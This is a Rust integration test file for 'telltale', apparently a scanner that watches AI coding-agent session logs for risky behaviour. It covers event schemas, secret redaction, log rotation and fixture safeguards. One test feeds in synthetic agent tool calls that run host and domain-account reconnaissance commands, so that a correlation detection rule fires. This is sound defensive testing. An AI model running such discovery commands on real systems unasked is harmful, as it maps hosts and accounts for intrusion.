fn scan_once_activity_includes_static_mcp_inventory_events() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("home");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
    fs::create_dir_all(&root).expect("root dir");
    fs::write(
        root.join(".mcp.json"),
        r#"{
            "mcpServers": {
                "github": {
                    "command": "npx",
                    "args": ["-y", "@modelcontextprotocol/server-github"],
                    "env": {"GITHUB_TOKEN": "synthetic-secret"},
                    "tools": [{"name": "list_issues"}, {"name": "create_issue"}]
                },
                "placeholder": {
                    "args": ["--flag-only"]
                }
            }
        }"#,
    )
    .expect("mcp config");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--emit-activity",
            "--no-local-config",
            "--root",
        ])
        .arg(&root)
        .args(["--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["activity_count"], 2);

    let lines = fs::read_to_string(log_path).expect("log file");
    let events = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect::<Vec<_>>();
    let inventory = events
        .iter()
        .find(|event| {
            event["event_type"] == "activity"
                && event["session_id"] == "mcp_inventory"
                && event["tool_name"] == "mcp::github"
        })
        .expect("mcp inventory event");
    let validator = event_schema_validator();
    assert!(
        validator.is_valid(inventory),
        "mcp inventory activity event should match schema: {inventory}"
    );
    let unsupported_inventory = events
        .iter()
        .find(|event| {
            event["event_type"] == "activity"
                && event["session_id"] == "mcp_inventory"
                && event["tool_name"] == "mcp::placeholder"
        })
        .expect("unsupported mcp inventory event");
    assert!(
        validator.is_valid(unsupported_inventory),
        "unsupported mcp inventory activity event should match schema: {unsupported_inventory}"
    );
    assert!(
        inventory["tags"]
            .as_array()
            .expect("tags")
            .iter()
            .any(|tag| tag == "mcp_inventory")
    );
    let evidence = inventory["evidence"][0]["redacted_value"]
        .as_str()
        .expect("evidence");
    assert!(evidence.contains("list_issues"));
    assert!(evidence.contains("GITHUB_TOKEN"));
    assert!(!evidence.contains("synthetic-secret"));
    assert!(
        unsupported_inventory["tags"]
            .as_array()
            .expect("unsupported tags")
            .iter()
            .any(|tag| tag == "mcp_inventory_unsupported")
    );
    let unsupported_evidence: Value = serde_json::from_str(
        unsupported_inventory["evidence"][0]["redacted_value"]
            .as_str()
            .expect("unsupported evidence"),
    )
    .expect("unsupported evidence json");
    assert_eq!(unsupported_evidence["supported"], false);
    assert_eq!(
        unsupported_evidence["unsupported_reason"],
        "missing_command_or_url"
    );
}

#[test]
fn scan_once_can_emit_session_risk_summary_events() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--emit-activity",
            "--emit-session-risk-summary",
            "--no-local-config",
            "--root",
            "tests/fixtures/session_stores",
            "--log-path",
        ])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert!(
        summary["session_risk_summary_count"]
            .as_u64()
            .unwrap_or_default()
            > 0
    );

    let lines = fs::read_to_string(log_path).expect("log file");
    let events = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect::<Vec<_>>();
    let summary_events = events
        .iter()
        .filter(|event| event["event_type"] == "session_risk_summary")
        .collect::<Vec<_>>();
    assert!(!summary_events.is_empty(), "session risk summary events");
    let validator = event_schema_validator();
    for summary_event in &summary_events {
        assert!(
            validator.is_valid(summary_event),
            "session_risk_summary event should match schema: {summary_event}"
        );
        let contribution_total = summary_event["risk_contributions"]
            .as_array()
            .expect("risk contributions")
            .iter()
            .map(|contribution| {
                contribution["points"]
                    .as_u64()
                    .expect("contribution points")
            })
            .sum::<u64>();
        assert_eq!(summary_event["risk_score"], contribution_total);
    }
    assert!(summary_events.iter().any(|event| {
        event["risk_score"].as_u64().unwrap_or_default() == 0
            && event["risk_contributions"]
                .as_array()
                .is_some_and(Vec::is_empty)
    }));
    let summary_event = summary_events
        .iter()
        .find(|event| event["risk_score"].as_u64().unwrap_or_default() > 0)
        .expect("positive session risk summary event");
    assert!(
        summary_event["tags"]
            .as_array()
            .expect("tags")
            .iter()
            .any(|tag| tag == "risk_summary")
    );
    assert!(
        summary_event["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .any(|item| item["field"] == "event_counts")
    );
    assert!(
        summary_event["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .any(|item| item["field"] == "risky_action_count")
    );
}

#[test]
fn scan_dry_run_session_risk_summary_does_not_write_log() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("scan-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--dry-run",
            "--emit-activity",
            "--emit-session-risk-summary",
            "--no-local-config",
            "--root",
            "tests/fixtures/session_stores",
            "--log-path",
        ])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["log_path"], Value::Null);
    assert!(
        summary["session_risk_summary_count"]
            .as_u64()
            .unwrap_or_default()
            > 0
    );
    assert!(!log_path.exists(), "dry-run should not write JSONL output");
}

#[test]
fn scan_rotates_jsonl_when_max_size_exceeded() {
    let temp = tempdir().expect("tempdir");
    let fixture_root = std::env::current_dir()
        .expect("current dir")
        .join("tests/fixtures/session_stores");
    let log_path = temp.path().join("logs/telltale-events.jsonl");

    // First scan creates the file (no rotation since file doesn't exist yet).
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .current_dir(temp.path())
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--root",
            fixture_root.to_str().expect("fixture path"),
            "--path-profile",
            "project",
            "--log-rotate-max-size",
            "1",
            "--log-rotate-keep",
            "3",
            "--max-sources",
            "1",
            "--emit-activity",
        ])
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "first scan stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(
        log_path.exists(),
        "active log file should exist after first scan"
    );

    // Second scan should trigger rotation (file exists and exceeds 1 byte).
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .current_dir(temp.path())
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--root",
            fixture_root.to_str().expect("fixture path"),
            "--path-profile",
            "project",
            "--log-rotate-max-size",
            "1",
            "--log-rotate-keep",
            "3",
            "--max-sources",
            "1",
            "--emit-activity",
            "--backfill",
        ])
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "second scan stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    // The active file should still exist with fresh content.
    assert!(
        log_path.exists(),
        "active log file should exist after rotation"
    );

    // At least one rotated file should exist.
    let parent = log_path.parent().expect("parent");
    let rotated: Vec<_> = std::fs::read_dir(parent)
        .expect("read dir")
        .filter_map(Result::ok)
        .filter(|e| {
            let name = e.file_name();
            let name = name.to_string_lossy();
            name.starts_with("telltale-events-") && name.ends_with(".jsonl")
        })
        .collect();
    assert!(
        !rotated.is_empty(),
        "expected at least one rotated file after exceeding max size"
    );

    // Rotated file should have a date in the name.
    let rotated_name = rotated[0].file_name().to_string_lossy().to_string();
    assert!(
        rotated_name.contains("telltale-events-2"),
        "rotated file should be date-stamped: {rotated_name}"
    );
}

#[test]
fn scan_with_log_rotate_disabled_does_not_rotate() {
    let temp = tempdir().expect("tempdir");
    let fixture_root = std::env::current_dir()
        .expect("current dir")
        .join("tests/fixtures/session_stores");
    let log_path = temp.path().join("logs/telltale-events.jsonl");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .current_dir(temp.path())
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--root",
            fixture_root.to_str().expect("fixture path"),
            "--path-profile",
            "project",
            "--log-rotate-disabled",
            "--max-sources",
            "1",
        ])
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    assert!(log_path.exists(), "active log file should exist");

    // No rotated files should exist.
    let parent = log_path.parent().expect("parent");
    let rotated: Vec<_> = std::fs::read_dir(parent)
        .expect("read dir")
        .filter_map(Result::ok)
        .filter(|e| {
            let name = e.file_name();
            let name = name.to_string_lossy();
            name.starts_with("telltale-events-") && name.ends_with(".jsonl")
        })
        .collect();
    assert!(
        rotated.is_empty(),
        "no rotated files when --log-rotate-disabled is set"
    );
}

#[test]
fn scan_project_path_profile_separates_jsonl_telemetry_from_state() {
    let temp = tempdir().expect("tempdir");
    let fixture_root = std::env::current_dir()
        .expect("current dir")
        .join("tests/fixtures/session_stores");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .current_dir(temp.path())
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--root",
            fixture_root.to_str().expect("fixture path"),
            "--path-profile",
            "project",
            "--max-sources",
            "1",
        ])
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["log_path"], "logs/telltale-events.jsonl");
    assert!(temp.path().join("logs/telltale-events.jsonl").is_file());
    assert!(temp.path().join("state/telltale-state.json").is_file());
    assert!(!temp.path().join("logs/telltale-state.json").exists());
}

#[test]
fn scan_uses_env_log_and_state_defaults() {
    let temp = tempdir().expect("tempdir");
    let fixture_root = std::env::current_dir()
        .expect("current dir")
        .join("tests/fixtures/session_stores");
    let log_path = temp.path().join("env-logs/telltale-events.jsonl");
    let state_path = temp.path().join("env-state/telltale-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .current_dir(temp.path())
        .env("TELLTALE_LOG_PATH", &log_path)
        .env("TELLTALE_STATE_PATH", &state_path)
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--root",
            fixture_root.to_str().expect("fixture path"),
            "--max-sources",
            "1",
        ])
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["log_path"], "[sensitive-path]");
    assert!(log_path.is_file());
    assert!(state_path.is_file());
    assert!(!temp.path().join("logs/telltale-events.jsonl").exists());
    assert!(!temp.path().join("state/telltale-state.json").exists());
}

#[test]
fn scan_invalid_root_reports_privacy_safe_fallback_diagnostics() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("invalid-root-sentinel");
    let state_path = temp.path().join("telltale-state.json");
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["scan", "--once", "--dry-run", "--no-local-config", "--root"])
        .arg(&root)
        .arg("--state-path")
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(!stdout.contains("invalid-root-sentinel"));
    assert!(!stderr.contains("invalid-root-sentinel"));
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["source_discovery"]["checked_status"], "first_error");
    assert_eq!(
        summary["source_discovery"]["first_error_category"],
        "invalid_root"
    );
    assert_eq!(
        summary["source_discovery"]["best_effort_fallback_used"],
        true
    );
    assert_eq!(summary["source_discovery"]["returned_source_count"], 0);
    assert_eq!(summary["source_discovery"]["operational_source_count"], 0);
    assert_eq!(
        summary["diagnostic_warnings"],
        serde_json::json!([
            {
                "code": "source_discovery_degraded",
                "classification": "observed_failure",
                "basis": "source_discovery"
            },
            {
                "code": "no_sources_selected",
                "classification": "suspicious_zero",
                "basis": "source_selection"
            }
        ])
    );
}

#[test]
fn project_config_failures_are_aggregated_without_path_or_error_leakage() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("invalid-root-sentinel");
    let project = temp.path().join("valid-project");
    fs::create_dir_all(project.join("logs/copilot")).expect("project");
    fs::copy(
        "tests/fixtures/session_stores/copilot/process-uc001.log",
        project.join("logs/copilot/process-uc001.log"),
    )
    .expect("copilot project source");
    let good_config = temp.path().join("good-projects.yaml");
    let bad_config = temp.path().join("bad-projects-error-sentinel.yaml");
    fs::write(
        &good_config,
        format!(
            "projects:\n  - name: valid\n    path: '{}'\n",
            project.display()
        ),
    )
    .expect("good project config");
    fs::write(&bad_config, "projects: [not valid yaml").expect("bad project config");
    let log_path = temp.path().join("events.jsonl");
    let state_path = temp.path().join("state.json");
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["scan", "--once", "--no-local-config", "--root"])
        .arg(&root)
        .args(["--project-config"])
        .arg(&good_config)
        .args(["--project-config"])
        .arg(&bad_config)
        .args(["--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    for sentinel in ["bad-projects-error-sentinel", "not valid yaml"] {
        assert!(!stdout.contains(sentinel));
        assert!(!stderr.contains(sentinel));
    }
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["source_discovery"]["checked_status"], "first_error");
    assert_eq!(
        summary["source_discovery"]["first_error_category"],
        "invalid_root"
    );
    assert_eq!(
        summary["source_discovery"]["best_effort_fallback_used"],
        true
    );
    assert!(
        summary["source_discovery"]["returned_source_count"]
            .as_u64()
            .unwrap()
            > 0
    );
    assert!(
        summary["diagnostic_warnings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|warning| warning["code"] == "source_discovery_degraded")
    );
    assert_eq!(
        summary["source_discovery"]["project_configuration"],
        serde_json::json!({
            "mode": "configured_documents",
            "document_attempt_count": 2,
            "document_success_count": 1,
            "document_failure_count": 1,
            "loaded_project_count": 1,
        })
    );
    assert!(
        summary["diagnostic_warnings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|warning| warning["code"] == "project_config_load_failed")
    );
    let events = fs::read_to_string(&log_path).expect("events");
    assert!(!events.contains("bad-projects-error-sentinel"));
    assert!(!events.contains("not valid yaml"));
}

#[test]
fn scan_once_continues_after_malformed_source() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let codex_sessions = root.join("codex/sessions");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("malformed-source.jsonl"),
        include_str!("../../tests/fixtures/rule_samples/malformed-source.jsonl"),
    )
    .expect("malformed fixture");
    fs::write(
        codex_sessions.join("uc001-positive.jsonl"),
        include_str!(
            "../../tests/fixtures/session_stores/codex/sessions/2026/04/uc001-positive.jsonl"
        ),
    )
    .expect("positive fixture");

    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--no-local-config",
            "--root",
        ])
        .arg(&root)
        .args(["--install-inventory-disabled", "--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["detection_count"], 2);
    assert_eq!(summary["emitted_count"], 2);
    assert_eq!(summary["source_processing"]["selected_source_count"], 2);
    assert_eq!(
        summary["source_processing"]["parse_success_source_count"],
        1
    );
    assert_eq!(summary["source_processing"]["empty_source_count"], 0);
    assert_eq!(summary["source_processing"]["parse_error_source_count"], 1);
    assert_detection_flow_accounting(&summary, 1, 0);
    assert_eq!(
        summary["diagnostic_warnings"],
        serde_json::json!([
            {
                "code": "source_parse_error_observed",
                "classification": "observed_failure",
                "basis": "source_processing"
            },
            {
                "code": "source_coverage_partial",
                "classification": "coverage_limitation",
                "basis": "source_processing"
            },
            {
                "code": "no_tool_records_observed",
                "classification": "suspicious_zero",
                "basis": "source_processing"
            }
        ])
    );
    assert_eq!(summary["source_counts"]["codex.jsonl"], 2);

    let lines = fs::read_to_string(log_path).expect("log file");
    let events = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect::<Vec<_>>();
    assert_eq!(events.len(), 3);
    assert!(events.iter().any(|event| event["event_type"] == "detection"
        && event["session_id"] == "uc001-positive"
        && event["severity"] == "critical"));
    assert!(events.iter().any(|event| {
        event["event_type"] == "scanner_error"
            && event["severity"] == "informational"
            && event["session_id"] == "scanner"
            && event["tags"]
                .as_array()
                .unwrap()
                .contains(&Value::String("parse_failure".to_string()))
    }));
}

#[test]
fn scan_preserves_process_chain_correlation_then_ordinary_detection_order_with_policy() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let sessions = root.join("codex/sessions");
    fs::create_dir_all(&sessions).unwrap();
    let mut records =
        include_str!("../fixtures/custom_rules/custom-agent-behavior.jsonl").to_string();
    for (index, command) in [
        "cmd.exe /c hostname",
        "cmd.exe /c ipconfig /all",
        "cmd.exe /c net user /domain",
    ]
    .into_iter()
    .enumerate()
    {
        records.push_str(
            &serde_json::json!({
                "type": "response_item",
                "timestamp": format!("2026-05-08T10:0{index}:02Z"),
                "payload": {"type": "tool_call", "name": "shell", "arguments": command}
            })
            .to_string(),
        );
        records.push('\n');
    }
    fs::write(sessions.join("analysis.jsonl"), records).unwrap();
    let policy = temp.path().join("policy.yaml");
    fs::write(&policy, "name: analysis-order\n").unwrap();
    let log = temp.path().join("events.jsonl");
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--no-local-config",
            "--client",
            "codex",
            "--no-default-rules",
            "--rules",
        ])
        .arg(concat!(
            env!("CARGO_MANIFEST_DIR"),
            "/tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml"
        ))
        .arg("--policy")
        .arg(&policy)
        .arg("--root")
        .arg(&root)
        .arg("--log-path")
        .arg(&log)
        .arg("--state-path")
        .arg(temp.path().join("state.json"))
        .env("TELLTALE_PROCESS_CHAIN_DETECTIONS", "1")
        .output()
        .unwrap();
    assert!(
        output.status.success(),
        "{}",
        String::from_utf8_lossy(&output.stderr)
    );
    let events: Vec<Value> = fs::read_to_string(log)
        .unwrap()
        .lines()
        .map(|line| serde_json::from_str(line).unwrap())
        .collect();
    let analysis: Vec<&Value> = events
        .iter()
        .filter(|event| {
            matches!(
                event["event_type"].as_str(),
                Some("process_chain" | "correlation" | "detection" | "scanner_error")
            )
        })
        .collect();
    assert_eq!(
        analysis
            .iter()
            .map(|event| event["event_type"].as_str().unwrap())
            .collect::<Vec<_>>(),
        [
            "process_chain",
            "process_chain",
            "process_chain",
            "process_chain",
            "detection"
        ]
    );
    assert_eq!(
        analysis[3]["rule_ids"][0],
        "procchain.correlation.host_then_account_discovery"
    );
    assert_eq!(
        analysis[3]["signal_types"],
        serde_json::json!(["correlation"])
    );
    assert_eq!(
        analysis[4]["rule_ids"][0],
        "custom.agent.malicious_behavior"
    );
    let summary: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(
        summary["detection_flow"]["policy_match_accounting"],
        serde_json::json!({
            "status": "available",
            "pre_policy_detection_candidate_count": 1,
            "fully_filtered_detection_candidate_count": 0,
            "filtered_rule_id_count": 0
        })
    );
}

#[test]
fn scan_once_refuses_fixture_root_without_allow_fixtures() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--root",
            "tests/fixtures/session_stores",
            "--log-path",
        ])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("refusing to write fixture/demo data"));
    assert!(!log_path.exists());
}

#[cfg(windows)]
#[test]
fn scan_windows_opencode_desktop_with_default_home_and_data_home_roots() {
    let temp = tempdir().unwrap();
    let home = temp.path().join("home");
    let data_home = home.join(".local/share");
    fs::create_dir_all(data_home.join("opencode")).unwrap();
    fs::copy(
        "tests/fixtures/session_stores/opencode/opencode.db",
        data_home.join("opencode/opencode.db"),
    )
    .unwrap();
    let cli = home.join("AppData/Roaming/ai.opencode.desktop/cli/2.0.24/opencode-cli.exe");
    fs::create_dir_all(cli.parent().unwrap()).unwrap();
    fs::write(&cli, b"synthetic executable metadata").unwrap();

    for (index, root) in [Path::new("."), home.as_path(), data_home.as_path()]
        .into_iter()
        .enumerate()
    {
        let log = temp.path().join(format!("events-{index}.jsonl"));
        let state = temp.path().join(format!("state-{index}.json"));
        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .env_clear()
            .env("HOME", &home)
            .env("USERPROFILE", &home)
            .env("LOCALAPPDATA", home.join("AppData/Local"))
            .env("APPDATA", home.join("AppData/Roaming"))
            .current_dir(temp.path())
            .args([
                "scan",
                "--once",
                "--no-local-config",
                "--emit-activity",
                "--root",
            ])
            .arg(root)
            .arg("--log-path")
            .arg(&log)
            .arg("--state-path")
            .arg(&state)
            .output()
            .unwrap();
        assert!(
            output.status.success(),
            "{}",
            String::from_utf8_lossy(&output.stderr)
        );
        let summary: Value = serde_json::from_slice(&output.stdout).unwrap();
        assert_eq!(summary["source_counts"]["opencode.sqlite"], 1);
        assert_eq!(summary["source_processing"]["parse_error_source_count"], 0);
        let events = fs::read_to_string(&log).unwrap();
        let events = events
            .lines()
            .map(|line| serde_json::from_str::<Value>(line).unwrap())
            .collect::<Vec<_>>();
        assert!(
            events
                .iter()
                .any(|event| event["client"] == "opencode" && event["event_type"] == "activity")
        );
        let saved: Value = serde_json::from_str(&fs::read_to_string(&state).unwrap()).unwrap();
        let agents = saved["install_inventory"]["agents"]
            .as_array()
            .expect("saved inventory agents");
        let opencode = agents
            .iter()
            .find(|agent| agent["agent"] == "opencode")
            .unwrap();
        assert_eq!(opencode["installed"], true);
        assert_eq!(opencode["confidence"], "confirmed");
    }
}

#[test]
fn scan_once_refuses_marked_opencode_only_fixtures() {
    let temp = tempdir().unwrap();
    fs::create_dir(temp.path().join("opencode")).unwrap();
    fs::write(temp.path().join("opencode/opencode.db"), b"synthetic").unwrap();
    fs::write(temp.path().join(".telltale-fixtures"), b"").unwrap();
    let log = temp.path().join("events.jsonl");
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["scan", "--once", "--no-local-config", "--root"])
        .arg(temp.path())
        .arg("--log-path")
        .arg(&log)
        .arg("--state-path")
        .arg(temp.path().join("state.json"))
        .output()
        .unwrap();
    assert!(!output.status.success());
    assert!(
        String::from_utf8_lossy(&output.stderr).contains("refusing to write fixture/demo data")
    );
    assert!(!log.exists());
}

#[test]
fn scan_once_allows_fixture_root_with_dry_run() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--dry-run",
            "--no-local-config",
            "--root",
            "tests/fixtures/session_stores",
            "--log-path",
        ])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["event_type"], "health");
    assert_eq!(summary["detection_count"], 30);
}

#[test]
fn watch_command_is_available_for_realtime_scans() {
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["watch", "--help"])
        .output()
        .expect("run telltale watch help");

    assert!(
        output.status.success(),
        "watch help failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("Watch local session stores"));
    assert!(stdout.contains("--debounce-ms"));
    assert!(stdout.contains("--min-scan-interval-ms"));
    assert!(stdout.contains("--iterations"));
    assert!(stdout.contains("--client"));
}

fn copy_dir_recursive(src: &Path, dst: &Path) {
    fs::create_dir_all(dst).expect("create copy target dir");
    for entry in fs::read_dir(src).expect("read copy source dir") {
        let entry = entry.expect("copy dir entry");
        let target = dst.join(entry.file_name());
        if entry.file_type().expect("copy entry file type").is_dir() {
            copy_dir_recursive(&entry.path(), &target);
        } else {
            fs::copy(entry.path(), &target).expect("copy fixture file");
        }
    }
}

#[cfg(target_os = "linux")]
fn inotify_directories(fdinfo: &str) -> Vec<(u64, u64)> {
    fdinfo
        .lines()
        .filter_map(|line| {
            if !line.trim_start().starts_with("inotify wd:") {
                return None;
            }
            let mut wd = None;
            let mut ino = None;
            let mut sdev = None;
            for field in line.split_whitespace() {
                if let Some(value) = field.strip_prefix("wd:") {
                    wd = u32::from_str_radix(value, 16).ok();
                }
                if let Some(value) = field.strip_prefix("ino:") {
                    ino = u64::from_str_radix(value, 16).ok();
                }
                if let Some(value) = field.strip_prefix("sdev:") {
                    sdev = u64::from_str_radix(value, 16).ok();
                }
            }
            wd.zip(ino).zip(sdev).map(|((_, ino), sdev)| (ino, sdev))
        })
        .collect()
}

#[cfg(target_os = "linux")]
fn inotify_directory_identity(directory: &Path) -> (u64, u64) {
    use std::os::unix::fs::MetadataExt;

    let metadata = fs::metadata(directory).expect("watched directory metadata");
    assert!(
        metadata.is_dir(),
        "watch readiness target must be a directory"
    );
    // fdinfo's sdev uses the kernel's dev_t layout, not libc's st_dev layout.
    let dev = metadata.dev();
    (
        metadata.ino(),
        ((libc::major(dev) as u64) << 20) | libc::minor(dev) as u64,
    )
}

#[cfg(target_os = "linux")]
fn observed_inotify_directories(pid: u32) -> Result<Vec<(u64, u64)>, String> {
    let mut observed = Vec::new();
    for entry in fs::read_dir(format!("/proc/{pid}/fd")).map_err(|error| error.to_string())? {
        let entry = entry.map_err(|error| error.to_string())?;
        match fs::read_link(entry.path()) {
            Ok(target) if target.to_string_lossy().contains("inotify") => {
                let path = format!("/proc/{pid}/fdinfo/{}", entry.file_name().to_string_lossy());
                match fs::read_to_string(path) {
                    Ok(info) => observed.extend(inotify_directories(&info)),
                    Err(error) if error.kind() == std::io::ErrorKind::NotFound => {}
                    Err(error) => return Err(error.to_string()),
                }
            }
            Ok(_) => {}
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => {}
            Err(error) => return Err(error.to_string()),
        }
    }
    Ok(observed)
}

fn fail_watch(child: &mut std::process::Child, reason: &str) -> ! {
    if child.try_wait().ok().flatten().is_none() {
        let _ = child.kill();
    }
    let _ = child.wait();
    let stdout = child.stdout.take().map(|mut pipe| {
        let mut bytes = Vec::new();
        pipe.read_to_end(&mut bytes).expect("read watch stdout");
        String::from_utf8_lossy(&bytes).into_owned()
    });
    let stderr = child.stderr.take().map(|mut pipe| {
        let mut bytes = Vec::new();
        pipe.read_to_end(&mut bytes).expect("read watch stderr");
        String::from_utf8_lossy(&bytes).into_owned()
    });
    panic!("{reason}; child stdout: {stdout:?}; child stderr: {stderr:?}");
}

#[cfg(target_os = "linux")]
fn wait_for_watch_ready(child: &mut std::process::Child, directory: &Path) {
    let expected = inotify_directory_identity(directory);
    let deadline = Instant::now() + Duration::from_secs(20);
    loop {
        if let Some(status) = child.try_wait().expect("poll watch readiness") {
            fail_watch(
                child,
                &format!(
                    "watch exited before directory registration: {status:?}; expected {expected:x?}"
                ),
            );
        }
        let observed = observed_inotify_directories(child.id()).unwrap_or_else(|error| {
            fail_watch(child, &format!("cannot inspect inotify watches: {error}"))
        });
        if observed.contains(&expected) {
            return;
        }
        if Instant::now() >= deadline {
            fail_watch(
                child,
                &format!(
                    "watch did not register target directory; expected {expected:x?}, observed {observed:x?}"
                ),
            );
        }
        thread::sleep(Duration::from_millis(20));
    }
}

#[cfg(not(target_os = "linux"))]
fn wait_for_watch_ready(_child: &mut std::process::Child, _directory: &Path) {
    thread::sleep(Duration::from_secs(2));
}

#[cfg(unix)]
fn is_sigterm_watch_summary(line: &str) -> bool {
    serde_json::from_str::<Value>(line).is_ok_and(|summary| {
        summary["event_type"] == "health"
            && summary["source_processing"]["parsed_record_count"]
                .as_u64()
                .is_some_and(|count| count >= 3)
    })
}

#[cfg(unix)]
fn append_sigterm_watch_trigger(session: &Path, attempt: u32) -> std::io::Result<()> {
    let mut file = fs::OpenOptions::new().append(true).open(session)?;
    writeln!(
        file,
        "{{\"type\":\"event_msg\",\"timestamp\":\"2026-04-01T00:00:02Z\",\"payload\":{{\"type\":\"user_message\",\"message\":\"synthetic SIGTERM watch trigger {attempt}\"}}}}"
    )
}

#[cfg(target_os = "linux")]
#[test]
fn watch_readiness_matches_whole_inotify_record_and_device() {
    let info = "inotify wd:1 ino:abc sdev:fc00000 mask:2\n\
